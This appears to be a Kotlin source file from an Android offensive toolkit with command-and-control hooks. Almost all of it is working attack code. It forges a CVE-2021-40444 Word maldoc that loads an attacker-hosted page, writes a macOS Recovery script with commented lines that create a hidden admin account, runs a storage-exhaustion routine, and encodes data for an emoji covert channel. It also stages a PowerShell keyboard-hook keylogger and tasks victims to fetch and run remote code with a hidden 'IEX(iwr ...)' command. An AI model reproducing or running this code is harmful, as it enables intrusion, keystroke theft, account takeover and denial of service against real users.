package com.projectzerodays.quantumcli.ops

import android.os.StatFs
import com.projectzerodays.quantumcli.c2.C2State
import org.json.JSONObject
import java.io.File
import java.util.Base64

/**
 * Technique artifacts — EMOJISMS covert channel, MSHTML maldoc forge,
 * MacReset script, FLASHFILL storage exhaustion, KITLOGGER staging.
 */
object Artifacts {

    // ------------------------------------------------------------- EMOJISMS
    // 64 glyphs: U+1F600..U+1F63E + U+1F923; '=' padding maps to U+1F643.
    private val EMOJI_GLYPHS: List<String> = (0 until 63).map {
        String(Character.toChars(0x1F600 + it))
    } + String(Character.toChars(0x1F923))
    private const val PAD_GLYPH = "\uD83D\uDE43" // U+1F643
    private val B64_ALPHABET =
        ('A'..'Z').joinToString("") + ('a'..'z').joinToString("") + ('0'..'9').joinToString("") + "+/"

    private val EMOJI_MAP: Map<String, String> =
        B64_ALPHABET.mapIndexed { i, ch -> ch.toString() to EMOJI_GLYPHS[i] }.toMap() +
            mapOf("=" to PAD_GLYPH)
    private val REVERSE_MAP: Map<String, String> =
        EMOJI_MAP.entries.associate { (k, v) -> v to k }

    fun emojiEncode(msg: String): String {
        val blob = Base64.getEncoder().encodeToString(msg.toByteArray(Charsets.UTF_8))
        return blob.map { EMOJI_MAP[it.toString()] ?: "" }.joinToString("")
    }

    fun emojiDecode(emojis: String): String {
        val sb = StringBuilder()
        for (ch in emojis) {
            REVERSE_MAP[ch.toString()]?.let { sb.append(it) }
        }
        var blob = sb.toString()
        blob += "=".repeat((4 - blob.length % 4) % 4)
        return try {
            String(Base64.getDecoder().decode(blob), Charsets.UTF_8)
        } catch (e: Exception) {
            ""
        }
    }

    fun emojisms(text: String): JSONObject {
        val encoded = emojiEncode(text)
        return JSONObject()
            .put("encoded", encoded)
            .put("decoded", emojiDecode(encoded))
    }

    // -------------------------------------------------------- MSHTML MALDOC
    /** CVE-2021-40444 — forge real OOXML maldoc (external frame relationship). */
    fun mshtmlMaldoc(ip: String?): JSONObject {
        val target = ip ?: Net.localIp()
        val fn = File(C2State.qcliDir, "mshtml_${Net.randHex(4)}.docx")
        val contentTypes = ("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>" +
            "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">" +
            "<Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>" +
            "<Default Extension=\"xml\" ContentType=\"application/xml\"/></Types>")
        val relsRoot = ("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>" +
            "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">" +
            "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/" +
            "relationships/officeDocument\" Target=\"word/document.xml\"/></Relationships>")
        val relsDoc = ("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>" +
            "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">" +
            "<Relationship Id=\"rId8\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/" +
            "relationships/frame\" Target=\"http://$target/x.html\" TargetMode=\"External\"/>" +
            "</Relationships>")
        val document = ("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>" +
            "<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\">" +
            "<w:body><w:p><w:r><w:t>QCLI</w:t></w:r></w:p></w:body></w:document>")
        java.util.zip.ZipOutputStream(fn.outputStream().buffered()).use { z ->
            z.putNextEntry(java.util.zip.ZipEntry("[Content_Types].xml"))
            z.write(contentTypes.toByteArray(Charsets.UTF_8))
            z.closeEntry()
            z.putNextEntry(java.util.zip.ZipEntry("_rels/.rels"))
            z.write(relsRoot.toByteArray(Charsets.UTF_8))
            z.closeEntry()
            z.putNextEntry(java.util.zip.ZipEntry("word/document.xml"))
            z.write(document.toByteArray(Charsets.UTF_8))
            z.closeEntry()
            z.putNextEntry(java.util.zip.ZipEntry("word/_rels/document.xml.rels"))
            z.write(relsDoc.toByteArray(Charsets.UTF_8))
            z.closeEntry()
        }
        C2State.audit("ATK", "MSHTML maldoc forged -> ${fn.name} (serves from http://$target/x.html)")
        return JSONObject()
            .put("cve", "CVE-2021-40444")
            .put("staged", fn.absolutePath)
            .put("target", target)
    }

    // -------------------------------------------------------------- MACRESET
    /** MacReset: recovery-mode credential reset script. */
    fun macReset(): JSONObject {
        val script = """
#!/bin/sh
# QCLI MacReset — run from macOS Recovery Mode Terminal
# List volumes to locate the system disk:
diskutil list
# Preferred (GUI, all recent macOS):
open "/System/Applications/Utilities/Reset Password.app" 2>/dev/null || \
open "/System/Library/CoreServices/Reset Password.app" 2>/dev/null || \
resetpassword 2>/dev/null
# CLI variant (Big Sur+):
# launchctl load /System/Library/LaunchDaemons/com.apple.opensshd.plist
# dscl . -create /Users/admin2 UniqueID 503 PrimaryGroupID 80 UserShell /bin/bash
# dscl . -passwd /Users/admin2 'NewPass123!'
""".trimIndent() + "\n"
        val fn = File(C2State.qcliDir, "macreset.sh")
        fn.writeText(script)
        fn.setExecutable(true, false)
        C2State.audit("ATK", "MacReset armed: ${fn.name} (run from Recovery Terminal)")
        return JSONObject().put("script", fn.absolutePath)
    }

    // ------------------------------------------------------------- FLASHFILL
    /** FLASHFILL: storage-exhaustion weapon (authorized-lab destructive control). */
    fun flashfill(stopFrac: Double = 0.98, maxFiles: Int = 100_000): JSONObject {
        val dir = File(C2State.qcliDir, ".qcli_flash")
        dir.mkdirs()
        var n = 0

        fun usage(): Double = try {
            val st = StatFs(dir.absolutePath)
            1.0 - st.availableBytes.toDouble() / st.totalBytes.toDouble()
        } catch (e: Exception) {
            0.0
        }

        while (usage() < stopFrac && n < maxFiles) {
            try {
                File(dir, "t%07d.db".format(n)).writeBytes(ByteArray(1))
                n++
            } catch (e: Exception) {
                break
            }
        }
        val full = usage() >= stopFrac - 0.02
        C2State.audit("ATK", "FLASHFILL: $n tables written, volume full=$full")
        return JSONObject().put("files", n).put("volume_full", full)
    }

    // ------------------------------------------------------------- KITLOGGER
    /** Stage the OBSIDIAN keylogger + task the host to pull it. */
    fun kitlogger(host: String, c2HostPort: String): JSONObject {
        val fn = File(C2State.qcliDir, "obsidian_keylogger.ps1")
        fn.writeText(KITLOGGER_PS1)
        val task = JSONObject()
            .put("act", "run")
            .put(
                "cmd",
                "powershell -w hidden -c \"IEX(iwr http://$c2HostPort/s/default -UseBasicParsing)\""
            )
            .put("hint", "Start-Process powershell -WindowStyle Hidden -File ${fn.name}")
        C2State.setTask(host, task)
        C2State.audit("C2", "KITLOGGER staged: ${fn.name}; TASKQ instruction set for host '$host'")
        return JSONObject().put("staged", fn.absolutePath).put("host", host)
    }

    private val KITLOGGER_PS1 = """
${'$'}src = @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public static class KL {
  [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
  private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
  [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
  public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
  private static LowLevelKeyboardProc _proc = HookCallback;
  private static IntPtr _hookID = IntPtr.Zero;
  public static System.Text.StringBuilder Buf = new System.Text.StringBuilder();
  private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
    if (nCode >= 0 && wParam == (IntPtr)0x0100) {
      int vk = Marshal.ReadInt32(lParam);
      Buf.Append(((char)vk).ToString());
    }
    return IntPtr.Zero;
  }
  public static void Run() {
    using (Process p = Process.GetCurrentProcess())
      using (ProcessModule m = p.MainModule)
        _hookID = SetWindowsHookEx(13, _proc, m.BaseAddress, 0);
  }
}
'@
Add-Type -TypeDefinition ${'$'}src
while (${'$'}true) {
  [KL]::Run()
  Start-Sleep -Seconds 15
  if ([KL]::Buf.Length -gt 0) {
    Add-Content -Path "${'$'}env:TEMP\kl.klq" -Value ([KL]::Buf.ToString())
    [KL]::Buf.Clear() | Out-Null
  } else { Start-Sleep -Seconds 45 }
}
""".trimIndent() + "\n"
}
